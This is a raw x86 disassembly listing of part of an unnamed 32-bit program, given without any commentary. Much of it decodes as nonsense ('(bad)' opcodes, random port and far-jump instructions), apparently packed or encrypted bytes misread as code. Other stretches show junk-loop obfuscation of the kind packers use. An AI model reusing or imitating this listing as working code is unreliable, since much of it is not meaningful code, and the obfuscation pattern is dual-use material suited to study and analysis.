  407ad2:	clc    
  407ad3:	ret    0xde65
  407ad6:	inc    ecx
  407ad7:	mov    cl,0xe9
  407ad9:	pop    edx
  407ada:	sub    dl,dh
  407adc:	xor    ebx,DWORD PTR [ecx+0x67]
  407adf:	ret    
  407ae0:	push   ecx
  407ae1:	cmc    
  407ae2:	aam    0x89
  407ae4:	(bad)  
  407ae5:	out    0xe3,al
  407ae7:	popf   
  407ae8:	mov    edx,0x51886856
  407aed:	xor    BYTE PTR [edx+0x22],bh
  407af0:	pop    es
  407af1:	or     DWORD PTR [ecx+0x50d47830],eax
  407af7:	scas   al,BYTE PTR es:[edi]
  407af8:	ss out dx,eax
  407afa:	outs   dx,DWORD PTR ds:[esi]
  407afb:	jbe    0x407b15
  407afd:	stos   BYTE PTR es:[edi],al
  407afe:	fisttp QWORD PTR [eax+eax*4+0x4e]
  407b02:	inc    ecx
  407b03:	jecxz  0x407b4c
  407b05:	sub    cl,BYTE PTR [esi-0x3f248e22]
  407b0b:	lods   al,BYTE PTR ds:[esi]
  407b0c:	(bad)  
  407b0d:	dec    edi
  407b0e:	mov    edx,0x65996325
  407b13:	daa    
  407b14:	jns    0x407b4b
  407b16:	push   DWORD PTR [eax]
  407b18:	mov    ds:0xe59c7448,al
  407b1d:	fisttp DWORD PTR [ebx-0x4c490bcf]
  407b23:	xchg   ebx,eax
  407b24:	sti    
  407b25:	popa   
  407b26:	loope  0x407b0c
  407b28:	fsub   QWORD PTR ds:0xad4626da
  407b2e:	imul   esp,DWORD PTR [edx-0x1c],0xdb74cd7c
  407b35:	fcom   st(5)
  407b37:	dec    edx
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	jg     0x407c5f
  407c4c:	push   cs
  407c4d:	sub    DWORD PTR [ebx],0x57e7ecc
  407c53:	jl     0x407cd3
  407c55:	jle    0x407c9e
  407c57:	push   ebp
  407c58:	std    
  407c59:	and    DWORD PTR [ecx+0x4588171b],ecx
  407c5f:	gs cld 
  407c61:	cmc    
  407c62:	inc    ebp
  407c63:	adc    bh,dh
  407c65:	cdq    
  407c66:	pop    esi
  407c67:	xchg   esp,eax
  407c68:	out    0x6,eax
  407c6a:	pop    ebp
  407c6b:	repz cdq 
  407c6d:	mov    ds:0xb85d3474,eax
  407c72:	mov    bl,0x5a
  407c74:	lahf   
  407c75:	add    eax,0xe424c91e
  407c7a:	test   DWORD PTR ds:0x719ef808,edx
  407c80:	jg     0x407c61
  407c82:	(bad)  
  407c83:	xchg   edx,eax
  407c84:	jmp    0x407c81
  407c86:	ja     0x407c55
  407c88:	inc    ebp
  407c89:	rcr    dl,1
  407c8b:	add    ch,BYTE PTR ds:0xf9b778f9
  407c91:	loope  0x407cec
  407c93:	test   al,0x73
  407c95:	xor    al,0xa3
  407c97:	jecxz  0x407c72
  407c99:	xchg   edi,eax
  407c9a:	inc    esi
  407c9b:	iret   
  407c9c:	loope  0x407c6f
  407c9e:	into   
  407c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca0:	scas   eax,DWORD PTR es:[edi]
  407ca1:	(bad)  
  407ca2:	mov    bh,0xe5
  407ca4:	(bad)  
  407ca5:	repz dec esp
  407ca7:	push   0xffffff8c
  407ca9:	es pop esi
  407cab:	into   
  407cac:	imul   esi,ecx,0x56
  407caf:	shr    DWORD PTR [esp+eiz*4],cl
  407cb2:	ins    DWORD PTR es:[edi],dx
  407cb3:	dec    ebp
  407cb4:	and    eax,0x1921dacd
  407cb9:	push   esi
  407cba:	int    0x60
  407cbc:	push   edi
  407cbd:	mov    edi,0x5114fea4
  407cc2:	mov    ds:0x2b02724,eax
  407cc7:	fsubr  QWORD PTR [eax+0x7d]
  407cca:	fistp  WORD PTR [ecx-0x4e]
  407ccd:	push   0x3b
  407ccf:	pushf  
  407cd0:	repnz mov bh,0xb
  407cd3:	adc    eax,DWORD PTR [ebx]
  407cd5:	cmp    BYTE PTR [ebx],ah
  407cd7:	jecxz  0x407c74
  407cd9:	cli    
  407cda:	outs   dx,DWORD PTR ds:[esi]
  407cdb:	ja     0x407c8b
  407cdd:	cmp    al,bh
  407cdf:	mov    ds:0x6fe30687,al
  407ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ce5:	mov    cl,0xa4
  407ce7:	int    0xcc
  407ce9:	dec    esi
  407cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ceb:	test   DWORD PTR es:[esi+esi*4+0x72],0x94beabbc
  407cf4:	or     al,0xb
  407cf6:	(bad)  
  407cf7:	xor    al,0x36
  407cf9:	add    DWORD PTR [ebx],esp
  407cfb:	push   es
  407cfc:	xor    DWORD PTR [ebx-0x37],eax
  407cff:	push   eax
  407d00:	leave  
  407d01:	inc    esp
  407d02:	xor    al,0x78
  407d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d05:	cli    
  407d06:	xchg   ecx,eax
  407d07:	arpl   WORD PTR [edi-0xf],cx
  407d0a:	jle    0x407d11
  407d0c:	cmp    al,0x5b
  407d0e:	inc    edx
  407d0f:	push   edx
  407d10:	ret    
  407d11:	jmp    0x407ca6
  407d13:	or     DWORD PTR [edx],eax
  407d15:	cmp    edi,eax
  407d17:	rcl    BYTE PTR [eax-0x7301eb14],cl
  407d1d:	pop    ds
  407d1e:	ror    DWORD PTR [eax+eiz*2],cl
  407d21:	xor    BYTE PTR [eax+0x1c],dl
  407d24:	xor    al,0x5e
  407d26:	push   ecx
  407d27:	stos   BYTE PTR es:[edi],al
  407d28:	scas   eax,DWORD PTR es:[edi]
  407d29:	sbb    BYTE PTR [ecx],ch
  407d2b:	push   0xffffffb7
  407d2d:	mov    ds:0xf24e30a3,eax
  407d32:	adc    DWORD PTR [edx-0x29],esp
  407d35:	nop
  407d36:	sahf   
  407d37:	ins    DWORD PTR es:[edi],dx
  407d38:	and    DWORD PTR [edx-0x4a],esi
  407d3b:	adc    al,0xb7
  407d3d:	int3   
  407d3e:	jns    0x407d2b
  407d40:	jne    0x407d3c
  407d42:	inc    edx
  407d43:	xor    BYTE PTR [esp+edx*8-0x6e],dh
  407d47:	jl     0x407d6c
  407d49:	fcom   DWORD PTR [eax+edi*1-0x7f882009]
  407d50:	adc    BYTE PTR [ecx-0x7bef9327],cl
  407d56:	lods   al,BYTE PTR ds:[esi]
  407d57:	or     ecx,eax
  407d59:	ss in  al,0x1a
  407d5c:	sar    BYTE PTR [edx+0x4b0cd21],cl
  407d62:	sbb    bl,BYTE PTR [esi]
  407d64:	mov    esp,0x4b7c8636
  407d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d6a:	fwait
  407d6b:	icebp  
  407d6c:	or     DWORD PTR [ecx-0xba8b60d],0x4c
  407d73:	out    0x18,eax
  407d75:	cmp    ch,BYTE PTR [ecx+eiz*1-0x226ec7c]
  407d7c:	pop    ecx
  407d7d:	sbb    al,0x41
  407d7f:	and    sp,WORD PTR [ecx+0x59c41640]
  407d86:	and    cl,BYTE PTR [esi-0x3c]
  407d89:	push   0x6f7cfbac
  407d8e:	std    
  407d8f:	fs je  0x407df7
  407d92:	retf   
  407d93:	iret   
  407d94:	pop    es
  407d95:	lods   al,BYTE PTR ds:[esi]
  407d96:	and    al,0x66
  407d98:	add    al,0x78
  407d9a:	dec    eax
  407d9b:	jae    0x407d82
  407d9d:	lods   eax,DWORD PTR ds:[esi]
  407d9e:	rcr    ebx,1
  407da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da2:	push   ecx
  407da3:	xchg   esp,eax
  407da4:	jns    0x407d84
  407da6:	stc    
  407da7:	xor    ebp,ebx
  407da9:	das    
  407daa:	pusha  
  407dab:	sub    bl,ah
  407dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dae:	out    0xf6,eax
  407db0:	inc    esp
  407db1:	sub    ebp,DWORD PTR [edx]
  407db3:	pop    ebp
  407db4:	xor    ebx,DWORD PTR [esi-0x8]
  407db7:	mov    esp,0x91787f7e
  407dbc:	jnp    0x407db4
  407dbe:	fnsave [ebx+0xb520b3e]
  407dc4:	sar    ah,cl
  407dc6:	aas    
  407dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc8:	add    DWORD PTR [ecx+eax*2+0x563b213d],esp
  407dcf:	add    bl,BYTE PTR [esi-0x39]
  407dd2:	xchg   ebx,eax
  407dd3:	inc    ebx
  407dd4:	shl    BYTE PTR [ebx],cl
  407dd6:	(bad)  
  407dd7:	jo     0x407e0c
  407dd9:	sbb    eax,0xbd411027
  407dde:	mul    DWORD PTR [esp+edi*8-0x1ad74753]
  407de5:	aas    
  407de6:	jge    0x407e5a
  407de8:	jecxz  0x407de3
  407dea:	cmp    DWORD PTR [ecx-0x2c],eax
  407ded:	add    ebx,DWORD PTR [ebp-0x4212a8d2]
  407df3:	sub    eax,0x396d28ad
  407df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df9:	xor    eax,0x43b471b3
  407dfe:	sub    eax,0x9bec8313
  407e03:	xchg   ebp,eax
  407e04:	outs   dx,DWORD PTR ds:[esi]
  407e05:	iret   
  407e06:	xchg   ecx,eax
  407e07:	dec    edx
  407e08:	cmp    DWORD PTR [esi],ecx
  407e0a:	popf   
  407e0b:	pop    es
  407e0c:	jo     0x407dbd
  407e0e:	mov    al,0xea
  407e10:	push   ecx
  407e11:	pop    ebp
  407e13:	push   es
  407e14:	(bad)  
  407e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e16:	cmp    edi,DWORD PTR [esi]
  407e18:	adc    ah,BYTE PTR [ecx-0x13]
  407e1b:	push   eax
  407e1c:	jmp    0x407e96
  407e1e:	xchg   edx,eax
  407e1f:	jo     0x407e5f
  407e21:	cs xchg ebp,eax
  407e23:	cmp    edi,DWORD PTR [ebx-0xb6ab3d9]
  407e29:	cmc    
  407e2a:	push   cs
  407e2b:	in     eax,dx
  407e2c:	jno    0x407e7a
  407e2e:	dec    ebp
  407e2f:	dec    ebp
  407e30:	pop    ebp
  407e31:	je     0x407e61
  407e33:	xchg   edi,eax
  407e34:	lahf   
  407e35:	push   esi
  407e36:	add    ah,al
  407e38:	jmp    0x4581:0x8fb13b05
  407e3f:	and    DWORD PTR [eax+eax*2],eax
  407e42:	dec    eax
  407e43:	sub    edi,DWORD PTR [ebx-0x25]
  407e46:	and    eax,0x968ee669
  407e4b:	sbb    BYTE PTR [ecx+0x63d10ae9],dh
  407e51:	sar    esp,1
  407e53:	test   al,0x7d
  407e55:	retf   0xeade
  407e58:	imul   ebx,DWORD PTR [eax],0xaf8256d9
  407e5e:	stc    
  407e5f:	mov    BYTE PTR [edx-0x77],dl
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x5232be0d
  408191:	and    bh,BYTE PTR [esi]
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	jnp    0x408187
  40819c:	mov    bl,0x88
  40819e:	xor    DWORD PTR [esi+0x37da1615],eax
  4081a4:	cli    
  4081a5:	mov    cs,ecx
  4081a7:	div    BYTE PTR [esi+0x6b2080ad]
  4081ad:	inc    ecx
  4081ae:	pushaw 
  4081b0:	mov    dh,0xdf
  4081b2:	(bad)  
  4081b3:	iret   
  4081b4:	aas    
  4081b5:	jg     0x408212
  4081b7:	cmp    esi,DWORD PTR [ebp-0x1a]
  4081ba:	ret    
  4081bb:	xchg   esi,eax
  4081bc:	jae    0x4081ad
  4081be:	sbb    al,bh
  4081c0:	push   esp
  4081c1:	fdiv   DWORD PTR [ebp+0x58]
  4081c4:	xchg   edx,eax
  4081c5:	lds    ebp,FWORD PTR [eax]
  4081c7:	sub    BYTE PTR [esi],dl
  4081c9:	or     BYTE PTR [ebx+0x4f],bl
  4081cc:	jb     0x408240
  4081ce:	adc    al,0x7c
  4081d0:	fsub   QWORD PTR [ecx]
  4081d2:	in     eax,0xb6
  4081d4:	add    bh,BYTE PTR [edx-0x7160c661]
  4081da:	inc    ecx
  4081db:	sbb    al,BYTE PTR [edi]
  4081dd:	adc    eax,0x8e5faa31
  4081e2:	int3   
  4081e3:	leave  
  4081e4:	push   ss
  4081e5:	mov    al,ds:0x187b5dbd
  4081ea:	out    0xb9,al
  4081ec:	mov    esp,0xba4cf3f4
  4081f1:	cld    
  4081f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f3:	repnz dec ecx
  4081f5:	rol    BYTE PTR [ecx+0x7d],1
  4081f8:	scas   al,BYTE PTR es:[edi]
  4081f9:	mov    ds:0x9d9e23a7,al
  4081ff:	(bad)  
  408200:	mov    BYTE PTR [edi+0x269e8ebc],cl
  408206:	hlt    
  408207:	pop    ebx
  408208:	or     edx,DWORD PTR [esp+ebp*8+0x4e]
  40820c:	add    eax,0x3238618c
  408211:	xor    BYTE PTR [ecx+0x7e],cl
  408214:	cmp    DWORD PTR [edx],ebx
  408216:	mov    bh,0x95
  408218:	das    
  408219:	pop    eax
  40821a:	sbb    esi,DWORD PTR [eax-0x57]
  40821d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40821e:	iret   
  40821f:	push   ds
  408220:	mov    eax,ds:0x317e2be0
  408225:	test   eax,0x3bb1cc6
  40822a:	repz fistp DWORD PTR [eax]
  40822d:	or     ch,BYTE PTR [eax+0x4873cd0a]
  408233:	adc    cl,al
  408235:	adc    al,dh
  408237:	imul   edi,DWORD PTR [eax-0x70],0x3dc98558
  40823e:	outs   dx,DWORD PTR ds:[esi]
  40823f:	push   esp
  408240:	add    BYTE PTR [edi-0x9],0x51
  408244:	adc    DWORD PTR [ebx+0x6c],edx
  408247:	inc    ecx
  408248:	sub    edi,esp
  40824a:	lea    edi,[ebx]
  40824c:	data16 in al,dx
  40824e:	inc    ebx
  40824f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408250:	sbb    ebx,edi
  408252:	gs enter 0x8a29,0xee
  408257:	add    al,0xa6
  408259:	or     al,0xc5
  40825b:	jnp    0x408291
  40825d:	add    eax,0xf89419c6
  408262:	inc    eax
  408263:	mov    ebp,0xfc2c86f
  408268:	jmp    0xa397:0xdf32bab5
  40826f:	fsubr  st(1),st
  408271:	push   ebp
  408272:	sub    eax,0xe0024de5
  408277:	fisubr WORD PTR [esp+ebx*8+0x42]
  40827b:	mov    edi,0x442dca38
  408280:	out    0xfd,eax
  408282:	jecxz  0x40826e
  408284:	ins    DWORD PTR es:[edi],dx
  408285:	lods   al,BYTE PTR ds:[esi]
  408286:	dec    DWORD PTR [eax+0x70fe2029]
  40828c:	sub    BYTE PTR [ebx+0x1888b14a],ah
  408292:	push   edx
  408293:	cli    
  408294:	cdq    
  408295:	ds jge 0x408283
  408298:	aas    
  408299:	mov    bl,0xe7
  40829b:	outs   dx,DWORD PTR ds:[esi]
  40829c:	mov    al,0x4f
  40829e:	retf   0x93c
  4082a1:	inc    edx
  4082a2:	mov    ebx,0xd536a76f
  4082a7:	rol    DWORD PTR [esi-0xc5b55a0],1
  4082ad:	iret   
  4082ae:	pop    esi
  4082af:	cld    
  4082b0:	cwde   
  4082b1:	hlt    
  4082b2:	push   edx
  4082b3:	in     al,dx
  4082b4:	mov    ah,0x10
  4082b6:	sbb    eax,0x21e60118
  4082bb:	mov    ebx,0x2d899fec
  4082c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c1:	jl     0x40829e
  4082c3:	mov    ebx,0x7ad08679
  4082c8:	ins    BYTE PTR es:[edi],dx
  4082c9:	cmp    edx,DWORD PTR [ebx]
  4082cb:	jmp    0x408334
  4082cd:	mov    ah,0xd4
  4082cf:	jecxz  0x40832b
  4082d1:	push   esi
  4082d2:	rcr    BYTE PTR ds:0xae856ce,cl
  4082d8:	pop    eax
  4082d9:	fs fwait
  4082db:	ins    BYTE PTR es:[edi],dx
  4082dc:	inc    edx
  4082dd:	in     al,0x6c
  4082df:	jge    0x40834b
  4082e1:	push   0xbf264338
  4082e6:	jle    0x40833a
  4082e8:	inc    ecx
  4082e9:	pop    ecx
  4082ea:	or     esp,ebx
  4082ec:	in     al,0x3a
  4082ee:	mov    edi,DWORD PTR [ebx+edi*8-0x601c881b]
  4082f5:	js     0x408283
  4082f7:	shl    DWORD PTR [eax+0x7c0e3338],0xb
  4082fe:	sbb    al,0xcb
  408300:	lock adc BYTE PTR [edx],ah
  408303:	cmp    bl,BYTE PTR [ebx+0x70]
  408306:	in     eax,dx
  408307:	mov    DWORD PTR [ebx+0x55],ebx
  40830a:	outs   dx,BYTE PTR ds:[esi]
  40830b:	imul   eax,DWORD PTR ds:0x60a2b824,0xffffffb0
  408312:	mov    eax,?
  408314:	enter  0x9f69,0xf2
  408318:	mov    DWORD PTR [edi],eax
  40831a:	push   eax
  40831b:	xor    al,BYTE PTR [eax+0x1718c1dd]
  408321:	popa   
  408322:	mov    esp,DWORD PTR [ebx]
  408324:	xchg   edi,eax
  408325:	push   ecx
  408326:	addr16 push ebx
  408328:	dec    ebx
  408329:	sbb    al,0x49
  40832b:	pop    esi
  40832c:	mov    BYTE PTR [edx+0x5c],dh
  40832f:	mov    ebp,0xa8406344
  408334:	gs mov bl,0xbd
  408337:	shr    DWORD PTR [edi-0xa02f90f],1
  40833d:	pop    ss
  40833e:	ret    0x5080
  408341:	cld    
  408342:	pop    ecx
  408343:	xchg   esp,eax
  408344:	aad    0x6f
  408346:	pop    esi
  408347:	pop    edx
  408348:	add    eax,0x507dbd4f
  40834d:	adc    ch,BYTE PTR [ebx]
  40834f:	cmp    al,0xbd
  408351:	pop    ss
  408352:	jno    0x40832c
  408354:	pop    ebx
  408355:	pusha  
  408356:	sbb    eax,0x3b4ad2a7
  40835b:	xor    DWORD PTR [ebp-0x238be12d],ebx
  408361:	out    0x91,eax
  408363:	cld    
  408364:	xchg   ebx,eax
  408365:	jo     0x40834c
  408367:	sub    BYTE PTR [ebx-0x4],cl
  40836a:	enter  0xa070,0xf4
  40836e:	push   edi
  40836f:	(bad)  
  408370:	sbb    al,0x10
  408372:	call   0xd05c2d32
  408377:	out    dx,al
  408378:	cmp    DWORD PTR [edx],edx
  40837a:	add    ah,cl
  40837c:	xabort 0xb5
  40837f:	mov    esp,0x1fd6be51
  408384:	jb     0x40836e
  408386:	jmp    0x40838b
  408388:	xchg   ebp,eax
  408389:	scas   eax,DWORD PTR es:[edi]
  40838a:	lds    ebp,FWORD PTR [ebp-0x1b]
  40838d:	daa    
  40838e:	sub    bh,BYTE PTR [eax+0x2ce4a8de]
  408394:	add    dh,BYTE PTR [ebx-0x4cb8e107]
  40839a:	fmul   QWORD PTR [ebx]
  40839c:	je     0x4083cd
  40839e:	cmp    DWORD PTR [edi+0x1a84a358],esp
  4083a4:	adc    dh,BYTE PTR [ebx+0x66f396e1]
  4083aa:	leave  
  4083ab:	in     eax,0xde
  4083ad:	loopne 0x4083a3
  4083af:	scas   eax,DWORD PTR es:[edi]
  4083b0:	dec    ebx
  4083b1:	jno    0x408360
